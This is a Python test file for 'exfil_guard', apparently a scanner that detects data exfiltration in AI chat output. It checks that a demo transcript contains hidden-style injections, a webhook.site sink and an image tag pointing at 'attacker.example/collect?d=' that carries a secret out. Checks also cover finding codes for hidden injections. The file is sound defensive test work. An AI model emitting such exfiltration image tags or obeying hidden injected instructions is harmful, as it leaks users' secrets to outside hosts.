"""Tests for the deterministic demo generator."""

from __future__ import annotations

import unittest

from exfil_guard.demo import (
    DEFAULT_SINK,
    DEMO_SECRET,
    build_demo,
    build_demo_page,
    demo_payloads,
    demo_transcript,
)


class DemoTests(unittest.TestCase):
    def test_assertions_all_pass(self):
        demo = build_demo()
        self.assertTrue(demo["assertions"])
        for name, value in demo["assertions"].items():
            self.assertTrue(value, name)

    def test_transcript_is_deterministic(self):
        self.assertEqual(demo_transcript(), demo_transcript())

    def test_pages_are_deterministic(self):
        first = build_demo_page()
        second = build_demo_page()
        self.assertEqual(first, second)

    def test_transcript_contains_exfiltration_vectors(self):
        transcript = demo_transcript()
        self.assertIn(DEFAULT_SINK, transcript)
        self.assertIn("display:none", transcript)
        self.assertIn("webhook.site", transcript)
        self.assertIn(DEMO_SECRET, transcript)

    def test_payloads_encode_the_demo_markers(self):
        payloads = demo_payloads()
        self.assertIn(DEMO_SECRET, payloads["conversation"])
        demo = build_demo()
        decoded = {entry["name"]: entry["decoded"] for entry in demo["payloads"]}
        self.assertEqual(decoded, payloads)

    def test_demo_page_renders_img_tag(self):
        page = build_demo_page()
        self.assertIn('<img src="https://attacker.example/collect?d=', page)
        self.assertIn("Network requests the browser makes", page)

    def test_clean_page_has_no_sink(self):
        page = build_demo_page(clean_page=True)
        self.assertNotIn("attacker.example", page)
        self.assertIn("The retry loop change looks correct.", page)

    def test_findings_include_all_documented_codes(self):
        codes = {finding["code"] for finding in build_demo()["findings"]}
        for expected in ("EG-EXFIL-URL", "EG-REMOTE-ASSET", "EG-HIDDEN-INJECTION", "EG-HIDDEN-STYLE", "EG-HIDDEN-COMMENT"):
            self.assertIn(expected, codes)

    def test_sink_override_is_reflected(self):
        sink = "http://127.0.0.1:8765/collect"
        transcript = demo_transcript(sink)
        self.assertIn(sink, transcript)
        self.assertNotIn(DEFAULT_SINK, transcript)


if __name__ == "__main__":
    unittest.main()
